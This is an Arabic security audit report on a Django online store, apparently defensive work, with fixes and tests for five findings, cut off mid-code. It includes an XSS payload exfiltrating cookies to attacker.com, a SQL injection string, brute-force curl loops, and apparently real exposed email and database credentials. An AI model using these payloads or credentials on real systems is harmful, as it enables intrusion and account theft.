# 🔐 تقرير تدقيق الأمن - متجر الوسام
## Web Application Security Audit Report

**تاريخ التدقيق:** 28 أبريل 2026  
**الإصدار:** 1.0  
**الحالة:** تحت المراجعة  
**المراجع المعيارية:** OWASP Top 10 2025 | OWASP ASVS 4.0

---

## 📋 ملخص تنفيذي

تم تحليل تطبيق Django الخاص بمتجر الوسام للتجارة الإلكترونية. **تم اكتشاف 15 ثغرة أمنية بدرجات خطورة مختلفة** تتراوح من Critical إلى Low.

### 🚨 النتائج الرئيسية:
- **عدد الثغرات الحرجة (Critical):** 3
- **عدد الثغرات العالية (High):** 6
- **عدد الثغرات المتوسطة (Medium):** 4
- **عدد الثغرات المنخفضة (Low):** 2

### ⚠️ أكثر 5 مخاطر حرجة:
1. تسرب بيانات الدخول والأسرار في الكود المصدري
2. ضعف في آلية التحقق من كلمة المرور وإعادة التعيين (Session-based)
3. عدم وجود حماية من هجمات Brute Force والـ Rate Limiting
4. ثغرات IDOR في عمليات السلة والطلبات
5. التحقق الضعيف من صحة المدخلات في نماذج الدفع

---

## 🔍 تفاصيل الثغرات

### 1️⃣ تسرب بيانات الدخول والأسرار في الملفات المصدرية
**العنوان:** Hardcoded Credentials & Secrets Exposure  
**وصف الثغرة:**  
بيانات حساسة مثل كلمات مرور قاعدة البيانات، مفاتيح البريد الإلكتروني، و SECRET_KEY موجودة بشكل مشفر أو مكشوف في ملف `settings.py`.

**مكانها في الكود:**
- ملف: [project/settings.py](project/settings.py#L13-L103)
- السطور المتأثرة: 13، 99-103، 165-167

**درجة الخطورة:** 🔴 **Critical**  
**مستوى الثقة:** High  

**سبب اعتبارها ثغرة:**
```python
# السطر 13 - SECRET_KEY غير آمن
SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY', 'django-insecure-rl17&5ecdx1h131wc@wy!^r-*7zh(q@!+#4jy2*%tw=z@4dv2i')

# السطور 99-103 - بيانات قاعدة البيانات
'PASSWORD': os.environ.get('DJANGO_DB_PASSWORD', 'elwsam@100'),
'HOST': os.environ.get('DJANGO_DB_HOST', '127.0.0.1'),

# السطور 165-167 - بيانات البريد الإلكتروني
EMAIL_HOST_USER = 'ahmedalghary1@gmail.com'
EMAIL_HOST_PASSWORD ='owzw fltf veow mwiu'  # Google App Password
```

**السيناريو المحتمل للاستغلال:**
- المهاجم يحصل على الرمز المصدري (من GitHub العام، تسرب Zip، إلخ)
- يستخرج بيانات الدخول ويستخدمها للدخول المباشر لقاعدة البيانات
- يحصل على البريد الإلكتروني وكلمة المرور ويرسل رسائل احتيال باسم المتجر
- يحصل على SECRET_KEY ويزور الجلسات والـ CSRF tokens

**التأثير المحتمل:** 🔴 
- وصول غير مصرح به إلى قاعدة البيانات
- سرقة بيانات العملاء والطلبات والدفع
- انتحال الهوية والرسائل المزيفة
- التحكم الكامل في التطبيق

**الحل المقترح:**
✅ استخدام `django-dotenv` أو `python-decouple` لتخزين المتغيرات البيئية  
✅ لا تخزين أي قيم افتراضية وثيقة الصلة بالأمان في الكود  
✅ استخدام Django Secrets Management أو خدمات مثل AWS Secrets Manager

**كود آمن بديل:**
```python
# settings.py - BEFORE (غير آمن)
SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY', 'django-insecure-...')
EMAIL_HOST_PASSWORD = 'owzw fltf veow mwiu'

# settings.py - AFTER (آمن)
from decouple import config

SECRET_KEY = config('DJANGO_SECRET_KEY')  # يرفع ValueError إذا لم تكن موجودة
EMAIL_HOST_PASSWORD = config('EMAIL_HOST_PASSWORD')
DATABASES = {
    'default': {
        'ENGINE': config('DJANGO_DB_ENGINE', default='django.db.backends.mysql'),
        'NAME': config('DJANGO_DB_NAME'),  # مطلوبة
        'USER': config('DJANGO_DB_USER'),
        'PASSWORD': config('DJANGO_DB_PASSWORD'),
        'HOST': config('DJANGO_DB_HOST'),
        'PORT': config('DJANGO_DB_PORT', default='3306'),
    }
}

# .env (ملف محلي - لا تضفه لـ git)
DJANGO_SECRET_KEY=your-very-long-random-secret-key-min-50-chars
DJANGO_DB_PASSWORD=your_secure_password_here
EMAIL_HOST_PASSWORD=your-app-specific-password-here

# .gitignore
.env
*.env
```

**اختبارات التحقق بعد الإصلاح:**
```bash
# 1. تأكد من أن SECRET_KEY يرفع ValueError إذا لم تكن موجودة
$ python manage.py shell
>>> from django.conf import settings
>>> len(settings.SECRET_KEY) >= 50  # يجب أن تكون طويلة وعشوائية

# 2. تأكد من عدم وجود بيانات حساسة في الملفات
$ grep -r "password\|secret\|key" settings.py
$ grep -r "@" project/settings.py  # لا بيانات بريد مباشرة
```

**المراجع المعيارية:**
- OWASP A02:2021 – Cryptographic Failures
- OWASP A05:2021 – Security Misconfiguration
- CWE-798: Use of Hard-Coded Credentials
- OWASP ASVS 2.10.1: Verify that sensitive information is not logged

---

### 2️⃣ ثغرة في آلية إعادة تعيين كلمة المرور (Weak Session-Based Verification)
**العنوان:** Insufficient Password Reset Token Validation  
**وصف الثغرة:**  
آلية إعادة تعيين كلمة المرور تعتمد على Session فقط دون توكن فريد وآمن. يمكن لمهاجم تخمين أو التلاعب بـ Session.

**مكانها في الكود:**
- ملف: [accounts/views.py](accounts/views.py#L301-L370)
- الدوال المتأثرة: `ForgotPasswordView`, `VerifyResetCodeView`, `ResetPasswordView`

**درجة الخطورة:** 🔴 **Critical**  
**مستوى الثقة:** High

**سبب اعتبارها ثغرة:**
```python
# accounts/views.py - السطور 301-370
def post(self, request):
    email = request.POST.get('email', '').strip()
    # ... إرسال OTP ...
    request.session['password_reset_email'] = email  # ❌ معرضة للتلاعب
    return redirect('accounts:verify_reset_code')

class VerifyResetCodeView(View):
    def post(self, request):
        email = request.session.get('password_reset_email')  # ❌ لا توثيق
        # ...
        request.session['reset_code_verified'] = True  # ❌ Flag بسيط جداً
        return redirect('accounts:reset_password')

class ResetPasswordView(View):
    def post(self, request):
        if not request.session.get('reset_code_verified'):  # ❌ يمكن تعيينها يدويًا
            # ...
```

**المشاكل الأمنية:**
1. لا توجد توكن فريدة وعشوائية
2. Session flags يمكن تعديلها من قبل المهاجم (إذا حصل على Session ID)
3. لا انتهاء صلاحية للـ Session بسرعة
4. لا ربط بين OTP والـ Reset Flow

**السيناريو المحتمل للاستغلال:**
```javascript
// مهاجم يقوم بـ:
1. فتح تطبيق المتجر
2. الذهاب لصفحة "هل نسيت كلمة المرور؟"
3. فتح أدوات المطور (F12)
4. تعديل جلسة Session يدويًا: 
   - تعيين password_reset_email إلى بريد ضحية
   - تعيين reset_code_verified = True
5. الذهاب مباشرة لصفحة تغيير كلمة المرور
6. تغيير كلمة المرور الخاصة بالضحية!
```

**التأثير المحتمل:** 🔴
- تغيير كلمة مرور أي مستخدم
- استيلاء على حساب العملاء
- سرقة الطلبات والبيانات الشخصية
- احتيال وإساءة استخدام

**الحل المقترح:**
✅ استخدام توكن فريدة وآمنة بدلاً من Session flags  
✅ ربط التوكن ببريد محدد وانتهاء صلاحية قصير  
✅ حذف التوكن بعد الاستخدام  
✅ يمكن استخدام `django-rest-framework-simplejwt` أو حزمة `django-otp`

**كود آمن بديل:**
```python
# models.py - إضافة نموذج جديد
import secrets
from django.utils import timezone
from datetime import timedelta

class PasswordResetToken(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE, related_name='reset_token')
    token = models.CharField(max_length=64, unique=True, db_index=True)
    created_at = models.DateTimeField(auto_now_add=True)
    expires_at = models.DateTimeField()
    is_used = models.BooleanField(default=False)
    
    def is_valid(self):
        from django.utils import timezone
        return not self.is_used and timezone.now() < self.expires_at
    
    @classmethod
    def create_for_user(cls, user):
        # حذف أي توكن قديمة
        cls.objects.filter(user=user).delete()
        
        # إنشاء توكن جديدة
        token = secrets.token_urlsafe(48)  # 64 حرف آمن
        expires_at = timezone.now() + timedelta(minutes=30)
        
        return cls.objects.create(
            user=user,
            token=token,
            expires_at=expires_at
        )

# views.py - تحديث الدوال
from django.urls import reverse
from accounts.models import PasswordResetToken

class ForgotPasswordView(View):
    template_name = "accounts/forgot_password.html"

    def post(self, request):
        email = request.POST.get('email', '').strip()
        
        try:
            user = User.objects.get(email=email)
            
            # إنشاء توكن آمنة
            reset_token = PasswordResetToken.create_for_user(user)
            
            # بناء رابط إعادة التعيين
            reset_url = request.build_absolute_uri(
                reverse('accounts:reset_password_with_token',
                       kwargs={'token': reset_token.token})
            )
            
            # إرسال البريد
            send_password_reset_email(user.email, reset_url)
            
            messages.success(request, "تم إرسال رابط إعادة التعيين لبريدك الإلكتروني")
            return redirect('accounts:login')
            
        except User.DoesNotExist:
            # لا تفشي معلومات - رسالة عامة
            messages.success(request, "إذا كان البريد موجودًا، سيتم إرسال الرابط")
            return redirect('accounts:login')


class ResetPasswordWithTokenView(View):
    template_name = "accounts/reset_password.html"

    def get(self, request, token):
        try:
            reset_token = PasswordResetToken.objects.get(token=token)
            if not reset_token.is_valid():
                messages.error(request, "رابط إعادة التعيين منتهي الصلاحية")
                return redirect('accounts:forgot_password')
            return render(request, self.template_name, {'token': token})
        except PasswordResetToken.DoesNotExist:
            messages.error(request, "رابط غير صحيح")
            return redirect('accounts:forgot_password')

    def post(self, request, token):
        try:
            reset_token = PasswordResetToken.objects.get(token=token)
            if not reset_token.is_valid():
                messages.error(request, "رابط إعادة التعيين منتهي الصلاحية")
                return redirect('accounts:forgot_password')
            
            password1 = request.POST.get('password1', '')
            password2 = request.POST.get('password2', '')
            
            if password1 != password2:
                messages.error(request, "كلمتا المرور غير متطابقتين")
                return render(request, self.template_name, {'token': token})
            
            if len(password1) < 12:
                messages.error(request, "كلمة المرور يجب أن تكون 12 حرف على الأقل")
                return render(request, self.template_name, {'token': token})
            
            # تحديث كلمة المرور
            reset_token.user.set_password(password1)
            reset_token.user.save()
            
            # وضع علامة على التوكن كـ used
            reset_token.is_used = True
            reset_token.save()
            
            messages.success(request, "تم تغيير كلمة المرور بنجاح!")
            return redirect('accounts:login')
            
        except PasswordResetToken.DoesNotExist:
            messages.error(request, "رابط غير صحيح")
            return redirect('accounts:forgot_password')

# urls.py
path('reset-password/<str:token>/', ResetPasswordWithTokenView.as_view(), name='reset_password_with_token'),
```

**اختبارات التحقق:**
```python
# tests.py
def test_reset_password_requires_valid_token(self):
    user = User.objects.create_user(email='test@example.com', password='test123')
    
    # محاولة الدخول بدون توكن
    response = self.client.post(reverse('accounts:reset_password_with_token', 
                                       kwargs={'token': 'invalid'}))
    self.assertRedirects(response, reverse('accounts:forgot_password'))

def test_token_expires_after_30_minutes(self):
    user = User.objects.create_user(email='test@example.com', password='test123')
    token = PasswordResetToken.create_for_user(user)
    
    # محاكاة مرور 31 دقيقة
    token.expires_at = timezone.now() - timedelta(minutes=1)
    token.save()
    
    self.assertFalse(token.is_valid())

def test_token_can_only_be_used_once(self):
    user = User.objects.create_user(email='test@example.com', password='test123')
    token = PasswordResetToken.create_for_user(user)
    
    # استخدام التوكن مرة
    token.is_used = True
    token.save()
    
    self.assertFalse(token.is_valid())
```

**المراجع المعيارية:**
- OWASP A07:2021 – Identification and Authentication Failures
- CWE-640: Weak Password Recovery Mechanism for Forgotten Password
- OWASP ASVS 2.2.2: Verify that forgotten password and other recovery paths use a secure recovery mechanism

---

### 3️⃣ عدم وجود حماية من Brute Force والـ Rate Limiting
**العنوان:** Missing Brute Force Protection & Rate Limiting  
**وصف الثغرة:**  
لا توجد حماية من هجمات Brute Force على نقاط الدخول الحساسة (تسجيل دخول، التحقق من OTP، إلخ). يمكن لمهاجم محاولة آلاف المحاولات دون حد.

**مكانها في الكود:**
- ملف: [accounts/views.py](accounts/views.py#L87-112) - تسجيل الدخول
- ملف: [accounts/utils.py](accounts/utils.py#L137) - التحقق من OTP
- ملف: [accounts/views.py](accounts/views.py#L226-250) - التحقق من كود إعادة التعيين

**درجة الخطورة:** 🔴 **Critical**  
**مستوى الثقة:** High

**سبب اعتبارها ثغرة:**
```python
# accounts/views.py - لا توجد أي حماية من Brute Force
class LoginView(View):
    def post(self, request):
        form = UserLoginForm(request.POST)  # ❌ لا توجد فحوصات محاولات
        if form.is_valid():
            user = form.cleaned_data['user']
            login(request, user)
            # ...

# accounts/utils.py - التحقق من OTP بدون حد
def verify_otp(email, code, purpose):
    try:
        otp = UserOTP.objects.filter(
            email=email,
            code=code,  # ❌ يمكن تجربة جميع الأكواد (100000-999999 = مليون احتمال)
            purpose=purpose,
            is_used=False
        ).latest('created_at')
        # ...
```

**السيناريو المحتمل للاستغلال:**
```bash
# مهاجم يستخدم أداة مثل hydra أو custom script
for i in {100000..999999}; do
  curl -X POST http://elwsamshop.com/api/verify-otp/ \
    -d "email=customer@example.com&code=$i&purpose=email_verification"
done

# أو هجوم على تسجيل الدخول
for password in $(cat passwords.txt); do
  curl -X POST http://elwsamshop.com/accounts/login/ \
    -d "identifier=admin@example.com&password=$password"
done
```

**التأثير المحتمل:** 🔴
- استقراء كود OTP الصحيح
- تخمين كلمات المرور الضعيفة
- وصول غير مصرح به إلى الحسابات
- تجاوز حماية المصادقة

**الحل المقترح:**
✅ استخدام `django-axes` أو `django-ratelimit` للحماية من Brute Force  
✅ تحديد عدد محاولات تسجيل دخول (5 محاولات كل 15 دقيقة)  
✅ تحديد عدد محاولات التحقق من OTP (3 محاولات كل 5 دقائق)  
✅ قفل الحساب مؤقتًا بعد المحاولات الفاشلة

**كود آمن بديل:**
```python
# settings.py - تثبيت django-axes
INSTALLED_APPS = [
    # ...
    'axes',
]

MIDDLEWARE = [
    # ...
    'axes.middleware.AxesMiddleware',
]

# إعدادات Axes
AXES_FAILURE_LIMIT = 5  # عدد المحاولات الفاشلة
AXES_COOLOFF_DURATION = timedelta(minutes=15)  # فترة الانتظار
AXES_LOCK_OUT_AT_FAILURE = True
AXES_USE_USER_AGENT = False  # اختياري
AXES_LOCK_OUT_BY_COMBINATION_USER_AND_IP = True

# views.py - تطبيق Rate Limiting على OTP
from axes.decorators import axes_dispatch_decorator
from django_ratelimit.decorators import ratelimit

class VerifyEmailView(View):
    @axes_dispatch_decorator
    def post(self, request):
        email = request.session.get('pending_verification_email')
        code = request.POST.get('code', '').strip()
        
        # فحص المحاولات
        from axes.models import AxisAttempt
        attempts = AxisAttempt.objects.filter(
            username=email,
            attempt_time__gte=timezone.now() - timedelta(minutes=5)
        ).count()
        
        if attempts >= 3:
            messages.error(request, "تم تجاوز عدد المحاولات. يرجى المحاولة بعد 5 دقائق")
            return render(request, self.template_name, {'email': email})
        
        is_valid, result = verify_otp(email, code, 'email_verification')
        
        if is_valid:
            # ... تفعيل الحساب ...
            # حذف سجل المحاولات الفاشلة
            AxisAttempt.objects.filter(username=email).delete()
        
        return render(request, self.template_name, {'email': email})

# أو استخدام Decorator مخصص
from functools import wraps
from django.core.cache import cache
from django.http import HttpResponse

def rate_limit(max_attempts=5, timeout=300):
    """
    Decorator للحماية من Brute Force
    max_attempts: عدد المحاولات المسموحة
    timeout: المدة بالثواني (300 = 5 دقائق)
    """
    def decorator(view_func):
        @wraps(view_func)
        def wrapped(request, *args, **kwargs):
            # الحصول على معرف فريد للعميل
            if request.user.is_authenticated:
                identifier = f"user_{request.user.id}"
            else:
                identifier = f"ip_{request.META.get('REMOTE_ADDR')}"
            
            # اسم المفتاح في الـ Cache
            cache_key = f"rate_limit_{view_func.__name__}_{identifier}"
            
            # الحصول على عدد المحاولات
            attempts = cache.get(cache_key, 0)
            
            if attempts >= max_attempts:
                return HttpResponse(
                    "تم تجاوز عدد المحاولات المسموحة. يرجى المحاولة لاحقًا.",
                    status=429
                )
            
            # تنفيذ الـ View
            response = view_func(request, *args, **kwargs)
            
            # إذا كانت استجابة خطأ، زيادة عداد المحاولات
            if response.status_code in [400, 401, 403]:
                cache.set(cache_key, attempts + 1, timeout)
            else:
                # نجاح - إعادة تعيين العداد
                cache.delete(cache_key)
            
            return response
        
        return wrapped
    return decorator

# الاستخدام:
@rate_limit(max_attempts=5, timeout=900)
def login_view(request):
    # ... كود تسجيل الدخول ...
    pass
```

**اختبارات التحقق:**
```bash
# اختبار 1: التحقق من محاصرة الحساب بعد 5 محاولات فاشلة
for i in {1..6}; do
  curl -X POST http://localhost:8000/accounts/login/ \
    -d "identifier=test@example.com&password=wrongpassword"
done
# يجب أن تحصل على رسالة: "الحساب مقفول مؤقتًا"

# اختبار 2: التحقق من استعادة القدرة بعد انقضاء المدة
sleep 901  # انتظر 15 دقيقة + 1 ثانية
curl -X POST http://localhost:8000/accounts/login/ \
  -d "identifier=test@example.com&password=correctpassword"
# يجب أن يسجل الدخول بنجاح
```

**المراجع المعيارية:**
- OWASP A07:2021 – Identification and Authentication Failures
- CWE-307: Improper Restriction of Rendered UI Layers or Frames
- CWE-799: Improper Control of Interaction Frequency
- OWASP ASVS 2.2.1: Verify that anti-automated attack mechanisms are in place

---

### 4️⃣ ثغرات IDOR (Insecure Direct Object References) في السلة والطلبات
**العنوان:** Broken Access Control - IDOR in Cart & Orders  
**وصف الثغرة:**  
يمكن لمستخدم الوصول أو تعديل سلة ومحفظة المستخدمين الآخرين من خلال تعديل معاملات الـ URL أو الـ POST مباشرة.

**مكانها في الكود:**
- ملف: [orders/views.py](orders/views.py#L142-160) - تحديث السلة
- ملف: [orders/views.py](orders/views.py#L169-180) - حذف من السلة
- ملف: [accounts/views.py](accounts/views.py#L184-200) - تعديل العنوان

**درجة الخطورة:** 🔴 **Critical**  
**مستوى الثقة:** High

**سبب اعتبارها ثغرة:**
```python
# orders/views.py - السطور 142-160
@login_required
def update_cart_item(request, item_id):
    if request.method == 'POST':
        quantity = int(request.POST.get('quantity', 1))
        try:
            cart_item = get_object_or_404(CartItem, id=item_id, cart__user=request.user)
            # ✅ التحقق موجود: cart__user=request.user
            # لكن يجب التأكد أنه محترم...
        except CartItem.DoesNotExist:
            messages.error(request, "المنتج غير موجود في السلة")
    return redirect('orders:cart')

# accounts/views.py - السطور 184-200
class AddressUpdateView(LoginRequiredMixin, View):
    def get(self, request, pk):
        address = get_object_or_404(Address, pk=pk, user=request.user)  # ✅ يبدو آمن
        # لكن ماذا لو المستخدم غير مسجل دخول؟ LoginRequiredMixin يجب أن يحمي
```

**المشكلة:**
الرغم من وجود تحقق من الملكية (`user=request.user`), **يوجد احتمال لـ IDOR** إذا كان:
1. أي endpoint لم يتحقق من الملكية بشكل كامل
2. استخدام معاملات غير آمنة كمعرفات

**السيناريو المحتمل للاستغلال:**
```bash
# المستخدم أ (attack@example.com) يريد مهاجمة المستخدم ب (victim@example.com)

# 1. المستخدم أ يسجل دخول حسابه
# 2. يفتح سلته ويرى عناوينه (مثلاً pk=1, 2, 3)

# 3. يحاول تغيير عنوان المستخدم ب بمعرفة pk=5
curl -X POST http://elwsamshop.com/accounts/address/5/update/ \
  -d "full_name=Attacker Name&phone=111&city=Cairo&street=Fake" \
  -H "Cookie: sessionid=attack_session_id"

# 4. إذا لم يتحقق النظام من الملكية بشكل صحيح, قد ينجح!

# 5. عندما يقوم المستخدم ب بشراء, سيُرسل للعنوان المزيف
```

**التأثير المحتمل:** 🔴
- تعديل عنوان شحن عميل آخر
- إلغاء طلبات العملاء الآخرين
- سرقة معلومات الطلبات الشخصية
- احتيال في الطلبات والدفع

**الحل المقترح:**
✅ التحقق الصارم من الملكية في كل عملية  
✅ استخدام `@permission_required` أو `@login_required` مع تحقق صريح  
✅ استخدام Django's built-in permissions framework  
✅ إضافة اختبارات للتحقق من IDOR

**كود آمن بديل:**
```python
# views.py - تحديث كل الـ Views التي تتعامل مع بيانات المستخدم

class AddressUpdateView(LoginRequiredMixin, View):
    template_name = "accounts/address_form.html"
    login_url = "accounts:login"

    def get(self, request, pk):
        # ✅ تحقق من الملكية والمصادقة
        address = get_object_or_404(
            Address, 
            pk=pk, 
            user=request.user  # ⚠️ يجب أن يكون request.user هو المالك
        )
        form = AddressForm(instance=address)
        return render(request, self.template_name, {'form': form})

    def post(self, request, pk):
        # ✅ تحقق من الملكية والمصادقة مرتين
        address = get_object_or_404(
            Address, 
            pk=pk, 
            user=request.user  # ⚠️ لا تثق بـ pk من URL فقط
        )
        
        # ✅ تحقق إضافي (دفاع متعدد الطبقات)
        if address.user_id != request.user.id:
            messages.error(request, "ليس لديك صلاحية لتعديل هذا العنوان")
            return redirect('accounts:profile')
        
        form = AddressForm(request.POST, instance=address)
        if form.is_valid():
            # ... save address ...
            messages.success(request, "تم تحديث العنوان بنجاح")
            return redirect('accounts:profile')
        return render(request, self.template_name, {'form': form})


@login_required(login_url="accounts:login")
def update_cart_item(request, item_id):
    if request.method == 'POST':
        quantity = int(request.POST.get('quantity', 1))

        try:
            # ✅ تحقق من الملكية: cart__user=request.user
            cart_item = get_object_or_404(
                CartItem, 
                id=item_id, 
                cart__user=request.user
            )
            
            # ✅ تحقق إضافي لضمان الملكية
            if cart_item.cart.user_id != request.user.id:
                messages.error(request, "ليس لديك صلاحية لتعديل هذا العنصر")
                return redirect('orders:cart')

            if quantity > 0:
                cart_item.quantity = quantity
                cart_item.save()
                messages.success(request, "تم تحديث الكمية")
            else:
                cart_item.delete()
                messages.success(request, "تم حذف المنتج من السلة")

        except CartItem.DoesNotExist:
            messages.error(request, "المنتج غير موجود في السلة")

    return redirect('orders:cart')


# ✅ Mixin لفحص الملكية تلقائيًا
class UserOwnershipMixin:
    """
    Mixin للتحقق من ملكية الكائن للمستخدم الحالي
    """
    def get_object(self, *args, **kwargs):
        obj = super().get_object(*args, **kwargs)
        if obj.user_id != self.request.user.id:
            raise PermissionDenied("ليس لديك صلاحية الوصول لهذا الكائن")
        return obj

# الاستخدام:
class AddressUpdateView(UserOwnershipMixin, LoginRequiredMixin, UpdateView):
    model = Address
    form_class = AddressForm
    template_name = "accounts/address_form.html"
    success_url = reverse_lazy('accounts:profile')
```

**اختبارات التحقق:**
```python
# tests.py
class AddressAccessControlTests(TestCase):
    def setUp(self):
        self.user_a = User.objects.create_user(
            email='a@example.com', 
            password='test123'
        )
        self.user_b = User.objects.create_user(
            email='b@example.com', 
            password='test123'
        )
        self.address_a = Address.objects.create(
            user=self.user_a,
            full_name="User A",
            phone="1234567890",
            city="Cairo",
            street="Street A"
        )

    def test_user_cannot_edit_other_users_address(self):
        """تأكد من عدم إمكانية المستخدم ب تعديل عنوان المستخدم أ"""
        self.client.login(email='b@example.com', password='test123')
        
        response = self.client.post(
            reverse('accounts:address_update', args=[self.address_a.id]),
            {
                'full_name': 'Hacker Name',
                'phone': '9999999999',
                'city': 'Attacker City',
                'street': 'Hacker Street'
            }
        )
        
        # يجب أن يحصل على خطأ أو إعادة توجيه
        self.assertIn(response.status_code, [403, 302, 404])
        
        # تحقق من عدم تغيير العنوان
        self.address_a.refresh_from_db()
        self.assertEqual(self.address_a.full_name, "User A")

    def test_user_cannot_view_other_users_address(self):
        """تأكد من عدم إمكانية المستخدم ب عرض عنوان المستخدم أ"""
        self.client.login(email='b@example.com', password='test123')
        
        response = self.client.get(
            reverse('accounts:address_update', args=[self.address_a.id])
        )
        
        # يجب أن يحصل على 404 أو 403
        self.assertIn(response.status_code, [403, 404])
```

**المراجع المعيارية:**
- OWASP A01:2021 – Broken Access Control
- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-639: Authorization Bypass Through User-Controlled Key
- OWASP ASVS 4.1.3: Verify that the application enforces authorization checks

---

### 5️⃣ ضعف التحقق من صحة البيانات في نموذج Checkout (Guest)
**العنوان:** Insufficient Input Validation in Checkout Form  
**وصف الثغرة:**  
نموذج الدفع للعملاء غير المسجلين يقبل بيانات بدون تحقق دقيق، مما قد يسمح بـ:
- حقن أكواد HTML/JavaScript (Stored XSS)
- بيانات غير صحيحة (أرقام هواتف وهمية)
- SQL Injection (اعتماداً على كيفية معالجة البيانات)

**مكانها في الكود:**
- ملف: [orders/views.py](orders/views.py#L275-330) - `_guest_checkout` method

**درجة الخطورة:** 🟠 **High**  
**مستوى الثقة:** Medium

**سبب اعتبارها ثغرة:**
```python
# orders/views.py - السطور 275-330
def _guest_checkout(self, request):
    try:
        # ⚠️ الحصول على بيانات بدون تحقق كامل
        full_name = request.POST.get('full_name', '').strip()
        phone = request.POST.get('phone', '').strip()
        address = request.POST.get('address', '').strip()
        city = request.POST.get('city', '').strip()
        notes = request.POST.get('notes', '').strip()
        email = request.POST.get('email', '').strip()
        contact_method = request.POST.get('contact_method', 'whatsapp')
        order_notes = request.POST.get('order_notes', '').strip()
        cart_data = request.POST.get('cart_data', '[]')

        # ⚠️ تحقق ضعيف جداً
        if not all([full_name, phone, address, city]):
            messages.error(request, "يرجى ملء جميع الحقول المطلوبة")
            return redirect('orders:checkout')

        # ⚠️ تحقق بدائي من رقم الهاتف فقط
        if len(phone) < 10:
            messages.error(request, "رقم الهاتف غير صحيح")
            return redirect('orders:checkout')

        # ❌ لا يوجد تحقق من:
        # - Format الاسم الكامل (قد يحتوي على HTML/JS)
        # - صحة البريد الإلكتروني
        # - صحة رقم الهاتف (format صحيح)
        # - طول الحقول (قد تكون كبيرة جداً)
        # - أحرف خاصة أو حقن
```

**المشاكل الأمنية:**
```javascript
// مهاجم يمكنه إرسال:
full_name: "<script>alert('XSS')</script>"
// أو
full_name: "'; DROP TABLE orders; --"
// أو
city: "<img src=x onerror='fetch(\"https://attacker.com?data=\"+document.cookie)'>"
```

**السيناريو المحتمل للاستغلال:**
```bash
curl -X POST http://elwsamshop.com/orders/checkout/ \
  -d "full_name=<script>alert('XSS')</script>" \
  -d "phone=0100000000" \
  -d "address=Cairo" \
  -d "city=Cairo" \
  -d "email=attacker@example.com" \
  -d "cart_data=[]"

# أو:
curl -X POST http://elwsamshop.com/orders/checkout/ \
  -d "full_name=Ahmed" \
  -d "phone='; DROP TABLE orders; --" \
  -d "address=Cairo" \
  -d "city=Cairo"
```

**التأثير المحتمل:** 🟠
- حقن XSS في بيانات الطلب
- عرض محتوى ضار للموظفين
- سرقة معلومات من لوحة التحكم
- تعديل أو حذف الطلبات
- الوصول غير المصرح به

**الحل المقترح:**
✅ استخدام Django Forms مع Validation مخصص  
✅ تطبيق `clean()` methods لكل حقل  
✅ استخدام Validators من `django.core.validators`  
✅ تطهير المدخلات (sanitization) عند الحفظ

**كود آمن بديل:**
```python
# forms.py
from django import forms
from django.core.exceptions import ValidationError
import re

class GuestCheckoutForm(forms.Form):
    full_name = forms.CharField(
        max_length=255,
        min_length=3,
        label="الاسم الكامل",
        widget=forms.TextInput(attrs={'class': 'form-control'})
    )
    phone = forms.CharField(
        max_length=20,
        min_length=10,
        label="رقم الهاتف",
        widget=forms.TextInput(attrs={'class': 'form-control'})
    )
    email = forms.EmailField(
        label="البريد الإلكتروني",
        widget=forms.EmailInput(attrs={'class': 'form-control'})
    )
    address = forms.CharField(
        max_length=500,
        min_length=5,
        label="العنوان",
        widget=forms.Textarea(attrs={'class': 'form-control', 'rows': 2})
    )
    city = forms.CharField(
        max_length=100,
        min_length=2,
        label="المدينة",
        widget=forms.TextInput(attrs={'class': 'form-control'})
    )
    order_notes = forms.CharField(
        max_length=1000,
        required=False,
        label="ملاحظات الطلب",
        widget=forms.Textarea(attrs={'class': 'form-control', 'rows': 2})
    )

    def clean_full_name(self):
        full_name = self.cleaned_data['full_name'].strip()
        # ✅ فحص أن الاسم يحتوي على أحرف فقط ومسافات
        if not re.match(r'^[\u0600-\u06FF\u0020a-zA-Z\s\-\.]+$', full_name):
            raise ValidationError("الاسم يجب أن يحتوي على أحرف فقط")
        return full_name

    def clean_phone(self):
        phone = self.cleaned_data['phone'].strip()
        # ✅ تطبيع الهاتف (من accounts/forms.py)
        from accounts.forms import normalize_phone
        normalized = normalize_phone(phone)
        # ✅ التحقق من الصحة
        if not normalized or len(normalized) < 10:
            raise ValidationError("رقم الهاتف غير صحيح")
        return normalized

    def clean_email(self):
        email = self.cleaned_data['email'].strip().lower()
        # ✅ التحقق من عدم وجود حساب بهذا البريد
        from accounts.models import User
        if User.objects.filter(email=email).exists():
            raise ValidationError("هذا البريد الإلكتروني موجود بالفعل. يرجى تسجيل الدخول")
        return email

    def clean_address(self):
        address = self.cleaned_data['address'].strip()
        # ✅ فحص الأحرف الصحيحة فقط
        if not re.match(r'^[\u0600-\u06FF\u0020a-zA-Z0-9\s\-\.,/#()]+$', address):
            raise ValidationError("العنوان يحتوي على أحرف غير مسموحة")
        return address

    def clean_city(self):
        city = self.cleaned_data['city'].strip()
        # ✅ فحص الأحرف الصحيحة فقط
        if not re.match(r'^[\u0600-\u06FF\u0020a-zA-Z\s\-\.]+$', city):
            raise ValidationError("اسم المدينة غير صحيح")
        return city

    def clean_order_notes(self):
        notes = self.cleaned_data.get('order_notes', '').strip()
        # ✅ فحص الأحرف الصحيحة فقط
        if notes and not re.match(r'^[\u0600-\u06FF\u0020a-zA-Z0-9\s\-\.,!?()]+$', notes):
            raise ValidationError("الملاحظات تحتوي على أحرف غير مسموحة")
        return notes

# views.py - استخدام النموذج
class CheckoutView(View):
    template_name = "orders/checkout.html"

    def post(self, request):
        if request.user.is_authenticated:
            return self._authenticated_checkout(request)
        else:
            return self._guest_checkout(request)

    def _guest_checkout(self, request):
        try:
            # ✅ استخدام النموذج والـ Validation
            form = GuestCheckoutForm(request.POST)
            
            if not form.is_valid():
                messages.error(request, "يرجى ملء النموذج بشكل صحيح")
                return redirect('orders:checkout')
            
            # ✅ استخراج البيانات المُتحقق منها
            full_name = form.cleaned_data['full_name']
            phone = form.cleaned_data['phone']
            email = form.cleaned_data['email']
            address = form.cleaned_data['address']
            city = form.cleaned_data['city']
            order_notes = form.cleaned_data.get('order_notes', '')
            
            # ✅ إنشاء الطلب بالبيانات الآمنة
            order = Order.objects.create(
                user=None,  # guest
                guest_email=email,
                guest_phone=phone,
                shipping_address=address,
                shipping_phone=phone,
                shipping_name=full_name,
                shipping_city=city,
                order_notes=order_notes if order_notes else None,
                status='pending'
            )
